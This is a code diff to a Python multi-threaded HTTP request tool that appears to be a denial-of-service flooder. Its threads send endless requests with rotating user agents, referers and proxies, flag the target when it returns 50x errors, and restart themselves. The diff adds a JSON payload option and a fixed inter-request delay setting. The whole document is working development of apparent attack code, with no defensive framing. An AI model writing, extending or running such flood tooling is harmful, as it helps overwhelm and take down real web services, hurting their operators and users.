@@ -93,14 +93,17 @@ class httpcall(threading.Thread):
         global config
         threading.Thread.__init__(self)
         self.randomdelay = config["thread"]["randomdelay"]
-        self.payload = json.loads(str(config["payload"]))
+        self.payload = str(config["payload"])
+        self.json = str(config["json"])
         self.useragents = useragents
         self.referers = referers
         self.limiter = config["thread"]["limiter"]
-        self.mindelay = int(config["thread"]["mindelay"]) / 1000
-        self.maxdelay = int(config["thread"]["maxdelay"]) / 1000
+        self.mindelay = int(config["thread"]["mindelay"])
+        self.maxdelay = int(config["thread"]["maxdelay"])
         self.method = str(config["method"]).lower()
         self.timeout = int(config["thread"]["timeout"])
+        self.normaldelay = int(config["thread"]["normaldelay"])
+        self.usenormaldelay = config["thread"]["usenormaldelay"]
         
         self.useproxies = config["useproxies"]
         self.limiter = config["thread"]["limiter"]
@@ -129,7 +132,7 @@ class httpcall(threading.Thread):
                             "Keep-Alive": str(random.randint(110,120)),
                             "Connection": "keep-alive",
                             "Host": host[k]
-                        }, data=self.payload, timeout=self.timeout)
+                        }, data=self.payload, json=self.json, timeout=self.timeout)
                         proxies.append(proxy)
                         if str(lres.status_code).startswith("50"):
                             set_flag(1)
@@ -158,7 +161,7 @@ class httpcall(threading.Thread):
                             "Keep-Alive": str(random.randint(110,120)),
                             "Connection": "keep-alive",
                             "Host": host[k]
-                        }, data=self.payload,timeout=self.timeout,proxies={
+                        }, data=self.payload, json=self.json, timeout=self.timeout, proxies={
                             "http":"http://"+proxy,
                             "https":"http://"+proxy,
                         })
@@ -184,6 +187,8 @@ class httpcall(threading.Thread):
                 time.sleep(random.randint(600,3000) / 1000)
             elif self.randomdelay == True:
                 time.sleep(random.randint(self.mindelay,self.maxdelay) / 1000)
+            elif self.usenormaldelay:
+                time.sleep(self.normaldelay / 1000)
             else:
                 pass
         httpcall().start()
